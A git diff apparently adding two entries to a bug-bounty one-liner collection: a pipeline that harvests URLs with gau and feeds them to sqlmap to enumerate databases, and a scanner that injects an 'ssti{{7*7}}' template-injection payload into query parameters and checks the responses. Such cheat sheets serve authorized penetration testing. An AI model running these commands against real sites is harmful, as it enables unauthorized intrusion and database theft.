@@ -497,3 +497,15 @@ curl -vs URL --stderr - | awk '/^content-security-policy:/' | grep -Eo "[a-zA-Z0
 ```bash
 nmap -v0 HOST -oX /dev/stdout | jc --xml -p | jq -r '.nmaprun.host | (.address["@addr"] + ":" + .ports.port[]["@portid"])' | httpx --silent
 ```
+
+### Filtering URLs and Exploiting SQL Injection
+> @tholkappiar
+```bash
+cat url.txt | gau | egrep -v '(.js|.png|.svg|.gif|.jpg|.txt)'|tee sqli.txt && sqlmap -m sqli.txt -dbs --batch
+```
+
+### Automated SSTI (Server-Side Template Injection) Vulnerability Scanner
+> @tholkappiar
+```bash
+cat url.txt | gau -subs | grep '=' | egrep -v '(\.js|\.png|\.svg|\.gif|\.jpg|\.jpeg|\.txt|\.css|\.ico)' | qsreplace "ssti{{7*7}}" | while read url; do cur=$(curl -s $url | grep "ssti49"); echo -e "$url -> $cur"; done
+```
